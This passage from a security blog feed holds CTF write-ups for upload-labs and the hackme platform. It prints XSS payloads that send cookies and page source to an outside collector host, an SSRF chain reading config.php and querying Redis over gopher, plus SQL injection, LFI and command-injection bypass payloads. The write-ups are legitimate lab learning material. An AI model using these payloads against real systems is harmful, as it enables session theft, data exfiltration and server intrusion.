src="https://i.imgur.com/r7yMqiE.png" alt=""></p><blockquote><p>reset - 将数组的内部指针设置为其第一个元素</p></blockquote><p>我们可以将第一个数组file[0]为shell.php/ file[1]为空,file[2]为jpg<br><img src="https://i.imgur.com/gfjvuJV.png" alt=""></p><p>上传成功</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>完结撒花o(<em>￣▽￣</em>)ブ</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://xz.aliyun.com/t/4029#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/4029#toc-16</a><br><a href="https://xz.aliyun.com/t/2657#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-8</a><br><a href="http://lawlietweb.com/2018/06/07/upload-labs/#%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3" target="_blank" rel="noopener">http://lawlietweb.com/2018/06/07/upload-labs/#%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3</a><br><a href="https://zhuanlan.zhihu.com/p/52099683" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/52099683</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      关于upload-labs Pass 16 ~ 20的writeup
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="文件上传" scheme="https://museljh.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>通过hackme中xss题目理解XSS所包含的巨大威力</title>
    <link href="https://museljh.github.io/2019/02/15/%E9%80%9A%E8%BF%87hackme%E4%B8%ADxss%E9%A2%98%E7%9B%AE%E7%90%86%E8%A7%A3XSS%E6%89%80%E5%8C%85%E5%90%AB%E7%9A%84%E5%B7%A8%E5%A4%A7%E5%A8%81%E5%8A%9B/"/>
    <id>https://museljh.github.io/2019/02/15/通过hackme中xss题目理解XSS所包含的巨大威力/</id>
    <published>2019-02-15T07:44:09.000Z</published>
    <updated>2019-02-15T07:58:05.148Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在此之前对xss了解只有script alert(1),遇到这几题之后深刻了解到自己对于xss的浅薄理解，并认识到XSS的巨大威力从XSS到SSRF再到Redis，特此放在与之前wp不同的地方，这里主要讲解一些这题里所包含的xss原理<br>题目地址<a href="https://hackme.inndy.tw/scoreboard/" target="_blank" rel="noopener">https://hackme.inndy.tw/scoreboard/</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1-xss探测"><a href="#1-xss探测" class="headerlink" title="1.xss探测"></a>1.xss探测</h3><p>先来个三步走<br><img src="https://i.imgur.com/kX1NrCI.png" alt=""><br>robots.txt中发现了个backup.zip的压缩包，下载下来发现需要压缩码，一般来说是不会让我们暴力破解的，猜测我们需要读取config.php中的内容<br><img src="https://i.imgur.com/GA43vO0.png" alt=""><br>既然题目叫xss me这里肯定需要xss的<br>经过一系列测试后发现&lt;svg/onload&gt;没有被过滤</p><blockquote><p>onload 事件</p></blockquote><p>当页面载入完毕后执行Javascript代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;myFunction()&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>以下 HTML 标签支持 onload :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;, &lt;frame&gt;, &lt;frameset&gt;, &lt;iframe&gt;, &lt;img&gt;, &lt;input type=&quot;image&quot;&gt;, &lt;link&gt;, &lt;script&gt;, &lt;style&gt;</span><br></pre></td></tr></table></figure></p><p>并且IE/FireFOx/Chrome都支持onload事件<br>那么Svg又是什么呢？<br>明明查的时候是这么解释的</p><blockquote><p>SVG 教程 SVG 意为可缩放矢量图形（Scalable Vector Graphics）。 SVG 使用 XML 格式定义图像。 现在开始学习 SVG! SVG 实例 My first SVG 尝试一下 » 点击 “尝试..</p></blockquote><p>为什么添加了一个svg就可以执行xss脚本呢，并且里面的实体编码就有效果了呢？？<br><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">SVG XSS的一个黑魔法</a><br><a href="https://blog.csdn.net/qq_35513598/article/details/79861908" target="_blank" rel="noopener">深入理解浏览器解析机制及XSS向量编码</a></p><p>大概意思我精简一下，当然想要深入了解可以看,毕竟我也只是刚刚接触无法做到深入透彻的了解<br>为什么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;后面能够支持实体编码，长话短说就是</span><br><span class="line">&lt;svg&gt;遵循XML和SVG的定义，我们知道，在XML中，&amp;#40;会被解析成（</span><br><span class="line">在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体</span><br></pre></td></tr></table></figure></p><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;xml&gt;</span><br><span class="line">    &lt;name&gt;aaa&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;aaaaaaa&amp;#40;&lt;/value&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure></p><p>会被转化成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;xml&gt;</span><br><span class="line">    &lt;name&gt;aaa&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;aaaaaaa)&lt;/value&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure></p><p>好吧，回到题目<br>我们可以通过构造类似如下PAYLoad<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;javascript:document.location=&apos;http://vps_ip:23333&apos;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>这里svg/onload中间的/是为了绕过空格限制，进行实体编码，这里要将vps_ip换成自己的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;xxxxxxx&quot;&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在不使用js伪协议的情况下javascript:是无法使用实体编码的，当然也可以这么构造&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>js伪协议</p><blockquote><p>简单来说就是一种关联使用js伪协议伪协议后面会当成javascript来执行，现在src后面已经禁止使用js伪协议了</p></blockquote><p>具体可以看<a href="https://www.cnblogs.com/song-song/p/5277838.html" target="_blank" rel="noopener">A标签使用javascript:伪协议</a></p><p><img src="https://i.imgur.com/GbNsUaK.png" alt=""><br>这种题目，一般是要获取cookie<br>于是开始构造payload打一波cookie（当然如果是http-only是不能获取到cookie的）<br>payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://ugelgr.ceye.io/?&apos;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>得到flag</p><h3 id="1-xssrf-leak"><a href="#1-xssrf-leak" class="headerlink" title="1.xssrf leak"></a>1.xssrf leak</h3><p>这里推荐大家一个xss接收平台</p><blockquote><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p></blockquote><p>这题很显然是要我们登入admin并且是本地登入ssrf<br>尝试使用之前admin的cookie试试登入<br>发现需要本地<br>改XFF是绕不过去的，而且这种设计XSS题一般思路都是用XSS去读源码<br>构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://ugelgr.ceye.io/?&apos;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>就是把源码以base64发给我们<br><img src="https://i.imgur.com/u0DQEHw.png" alt=""><br>现在才知道这个CTF平台是台湾科技大学的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;</span><br><span class="line">  &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;XSSRF&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class=&quot;navbar-nav&quot;&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">    &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">    &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">    &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt;</span><br><span class="line">    &lt;/li</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;</span><br><span class="line">      &lt;span class=&quot;navbar-text&quot;Hello, admin (Administrator)&lt;/span&gt;</span><br><span class="line">    &lt;/li</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;</span><br><span class="line"></span><br><span class="line">      &lt;div class=&quot;card text-white bg-dark&quot;</span><br><span class="line">        &lt;div class=&quot;card-body&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>发现 多了个request.php<br>我们应该要取读这个文件<br>在request.php发现可以插入xss<br><img src="https://i.imgur.com/hxt2bm1.png" alt=""><br>读取config.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/GyzafPo.png" alt=""></p><blockquote><p>onreadystatechange 是一个事件句柄。它的值 (state_Change) 是一个函数的名称，当 XMLHttpRequest 对象的状态发生改变时，会触发此函数。状态从 0 (uninitialized) 到 4 (complete) 进行变化。仅在状态为 4 时，我们才执行代码。</p></blockquote><blockquote><p>我们的实例在 open() 的第三个参数中使用了 “true”。<br>该参数规定请求是否异步处理。<br>True 表示脚本会在 send() 方法之后继续执行，而不等待来自服务器的响应。<br>onreadystatechange 事件使代码复杂化了。但是这是在没有得到服务器响应的情况下，防止代码停止的最安全的方法。<br>通过把该参数设置为 “false”，可以省去额外的 onreadystatechange 代码。如果在请求失败时是否执行其余的代码无关紧要，那么可以使用这个参数。</p></blockquote><p>得到flag</p><h3 id="3-xss-redis"><a href="#3-xss-redis" class="headerlink" title="3.xss redis"></a>3.xss redis</h3><blockquote><p>Steal flag from redis<br><img src="https://i.imgur.com/JNGJ0Vc.png" alt=""></p></blockquote><p>一想到redis 就想到gopher打未授权redis，想到..开花<br>要注意的是在SSRF利用gopher协议时，命令前要加_<br>同时要进行两次URL编码(实际解码了两次，SSRF本身要解码）<br>尝试下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_info%250a_quit&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/sTBSRHU.png" alt=""></p><p>确实是未授权</p><blockquote><p>Redis Info 命令以一种易于理解和阅读的格式，返回关于 Redis 服务器的各种信息和统计数值</p></blockquote><p>看下有没有KEY<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit&quot;);</span><br></pre></td></tr></table></figure></p><p>发现flag<br>尝试读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_get%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure></p><p>发现报错<br>发现类型错误了<br>那我们看看类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_type%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_llen%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure><p>发现是个list<br>那我们看看长度</p><p>发现是53<br>读取数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;);</span><br></pre></td></tr></table></figure><p>拼接下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=&apos;.....&apos;</span><br><span class="line">flag = s.replace(&apos;\n\n\n\n&apos;,&apos; &apos;)</span><br><span class="line">flag = flag.replace(&apos;$1&apos;,&apos;&apos;)</span><br><span class="line">flag = flag.replace(&apos;\n&apos;,&apos;&apos;)</span><br><span class="line">print(flag[::-1])</span><br></pre></td></tr></table></figure></p><blockquote><p>真的需要学习下redis的基本命令了</p></blockquote><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这题题目真的很好，暴露了我很多问题，比如对xss，redis认识都不够等等，同时也暴露了我对html，js的编码的不了解，接下来有时间一定要好好学习下，还有xss实在太强了</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.anquanke.com/post/id/156377" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156377</a><br><a href="http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      从xss到ssrf再到gopher打redis
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="xss" scheme="https://museljh.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>hackme web wp</title>
    <link href="https://museljh.github.io/2019/02/14/hackme%20web%20wp/"/>
    <id>https://museljh.github.io/2019/02/14/hackme web wp/</id>
    <published>2019-02-14T12:38:07.000Z</published>
    <updated>2019-02-14T13:08:46.747Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hack me 很不错的一个ctf平台，有些题目质量很高</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1-捉迷藏"><a href="#1-捉迷藏" class="headerlink" title="1.捉迷藏"></a>1.捉迷藏</h3><p>直接F12 输入flag字符查找</p><h3 id="2-留言"><a href="#2-留言" class="headerlink" title="2.留言"></a>2.留言</h3><blockquote><p>提示：这本留言簿很糟糕。sqlmap是你的朋友。<br>说明可以直接使用sqlmap</p></blockquote><p><img src="https://i.imgur.com/0EE9Ldx.png" alt=""><br>这边应该是可以注入的，<br>使用’会报错，使用’#就不会报错<br>大概它的语句是select xxx from xxx where xxx=’$xx’;<br>由于页面只会显示success与false估计只能使用布尔盲注了<br>但是我’ union select 1,2,3,database()# 却会报错<br>（后来想下这估计是使用insert注入…一开始我直接想当然以为它是select）<br>原因未知，使用下sqlmap试试<br>使用sqlmap貌似不可以，可能有什么黑名单之类的过滤。<br><img src="https://i.imgur.com/ttMjVLC.png" alt=""><br>这边的id参数也是可以注入的<br>直接使用联合注入方式<br>payload<br>爆数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0%20union%20select%201,2,3,database()#</span><br></pre></td></tr></table></figure></p><p>直接查出数据库是g8<br>爆表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20TABLE_NAME%20from%20information_schema.TABLES%20where%20TABLE_SCHEMA=%27g8%27%20limit%200,1),4#</span><br></pre></td></tr></table></figure></p><p>查出表为flag<br>爆列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20COLUMN_NAME%20from%20information_schema.COLUMNS%20where%20TABLE_NAME=%27flag%27%20limit%201,1),4#</span><br></pre></td></tr></table></figure></p><p>还是flag<br>爆flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20flag%20from%20flag%20limit%201,1),4#</span><br></pre></td></tr></table></figure></p><p>FLAG=<br>出来了</p><blockquote><p>(注：这边id=0是为了让第一个查询结果为空，不然是查询不出结果的)<br>尝试了下能不能用报错注入，不过没有错误信息所以不可以，盲注应该也是可以的我就不演示了。</p></blockquote><h3 id="3-LFI"><a href="#3-LFI" class="headerlink" title="3.LFI"></a>3.LFI</h3><blockquote><p>这个管理员的密码是什么？这根本不重要，只要拿到旗帜。<br>提示：LFI，php://filter</p></blockquote><p><img src="https://i.imgur.com/eNHrynx.png" alt=""><br>看下源码发现hint<br>显然这是要我们读取pages/flag这个文件<br><img src="https://i.imgur.com/jAjs9HZ.png" alt=""><br>直接试试嘿嘿。<br>这个？page估计是文件读取类似于file=xxx<br>根据题目提示：hp://filter<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</span><br></pre></td></tr></table></figure></p><p>直接爆出一段base64<br>解码获得<br>Can you read the flag&lt;?php require(‘config.php’); ?&gt;?</p><blockquote><p>php://filter/read=convert.base64-encode/resource=<br>可以将文件以base64的形式读取<br>这应该是要我们读取config文件<br>尝试下<br>爆出一段base64码<br>解码获得</p></blockquote><p>$flag = </p><h3 id="4-主页"><a href="#4-主页" class="headerlink" title="4.主页"></a>4.主页</h3><blockquote><p>国旗在哪里？你检查过代码了吗？<br>这题又是查看源码<br>但是find flag 只有第一题的flag<br>后来查了下原来这里有flag（一开始我还以为是乱码）</p></blockquote><blockquote><p><a href="https://hackme.inndy.tw/cute.js" target="_blank" rel="noopener">https://hackme.inndy.tw/cute.js</a></p></blockquote><p>可以使用aadecode进行解密</p><h3 id="5-ping"><a href="#5-ping" class="headerlink" title="5.ping"></a>5.ping</h3><blockquote><p>你能ping 127.0.0.1吗？</p></blockquote><p>进入题目发现一段源码<br><img src="https://i.imgur.com/havNdqe.png" alt=""><br>这段代码大概意思应该是输入ip且里面不能含有数组中的字段，最后会返回 ping后的内容<br>试试127.0.0.1试试<br><img src="https://i.imgur.com/jJ3nmvn.png" alt=""><br>没有得到什么有用的信息<br>那么应该就要绕过黑名单，实现命令执行<br>linux下多行命令</p><blockquote><p>在使用UNIX命令时，系统为了提高使用的灵活性，支持多种命令输入的方式。例如，当需要完成多个命令且命令执行期间不需要人工干预时，可将多个命令写在同一个命令行中，命令之间用分号（；）隔开<br>如：pwd；ls -l </p></blockquote><p>本来想这样试试的，结果貌似被过滤了，<br>试试其他方法</p><blockquote><p><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a><br><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p></blockquote><p>使用(反单引号)试试</p><blockquote><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p></blockquote><p><code>ls</code>后<br><img src="https://i.imgur.com/Fs02EmI.png" alt=""><br>试试其他方式,$(ls) 貌似也可以，其他的暂时没找到<br>然后构造?ip=<code>more *</code>拿到flag<br>在linux文件读取方式很多如tac，tail等等</p><h3 id="6-记分牌"><a href="#6-记分牌" class="headerlink" title="6.记分牌"></a>6.记分牌</h3><p>在header头部有flag</p><h3 id="7-以管理员身份登录0"><a href="#7-以管理员身份登录0" class="headerlink" title="7.    以管理员身份登录0"></a>7.    以管理员身份登录0</h3><blockquote><p>   提示：SQL注入！</p></blockquote><p>之间点击souce_code获取源码<br><img src="https://i.imgur.com/c9di8pW.png" alt=""><br>发现它对于‘会有转译，我们只要/’将它的转译转译就可以了<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos; union select 1,2,3,4#</span><br></pre></td></tr></table></figure></p><p>原先我用admin/‘ || 1=1 # 嗯它可能变成为admin<br>get flag</p><h3 id="8-以管理员身份登录0-1"><a href="#8-以管理员身份登录0-1" class="headerlink" title="8.    以管理员身份登录0.1"></a>8.    以管理员身份登录0.1</h3><p>貌似和上题一模一样，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;\&apos; UNION SELECT &quot; #&#125;, flag2 in the database!</span><br></pre></td></tr></table></figure></p><p>这么说我们要查询数据库了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos;union select 1,1,1,database()#</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/LG5Pp85.png" alt=""></p><p>发现没有反应，这里应该是要盲注了我这么想<br>结果直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos;union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure></p><p>发现貌似爆出的表<br>Hi, h1dden_f14g,user<br>难道数据库叫做1？？？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos; union  select 1,the_f14g,3,4 from h1dden_f14g#</span><br></pre></td></tr></table></figure></p><p>得出flag</p><h3 id="9-以管理员身份登录1"><a href="#9-以管理员身份登录1" class="headerlink" title="9.    以管理员身份登录1"></a>9.    以管理员身份登录1</h3><blockquote><p>   请以管理员身份登录。<br>提示：SQL注入但sqlmap不再工作。<br>更新：源代码现已上市。</p></blockquote><p>扫描仪无法工作<br>说明还是sql注入 但是不能直接使用sqlmap<br><img src="https://i.imgur.com/CxXwp3r.png" alt=""><br>过滤函数，<br>过滤了空格<br>空格绕过</p><blockquote><p>%09 TAB键（水平）<br>/**/<br>%0a 新建一行<br>%0c 新的一页<br>%0d return功能<br>%0b TAB键（垂直）<br>%a0 空格</p></blockquote><p>\‘来绕过单引号<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos;/**/union/**/select/**/1,2,3,4/**/#</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/Yy6j0a6.png" alt=""></p><h3 id="10-login-as-admin-1-2"><a href="#10-login-as-admin-1-2" class="headerlink" title="10.login as admin 1.2"></a>10.login as admin 1.2</h3><p>和上题貌似是一样的（吐槽下，这个ctf平台真的是利用资源阿）<br>题目提示要使用盲注<br>我们先联合注入一波试试<br><img src="https://i.imgur.com/xIpQsjD.png" alt=""><br>失败<br>看来只能盲注了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#求数据库的名字</span><br><span class="line">url = &quot;https://hackme.inndy.tw/login1/index.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload = 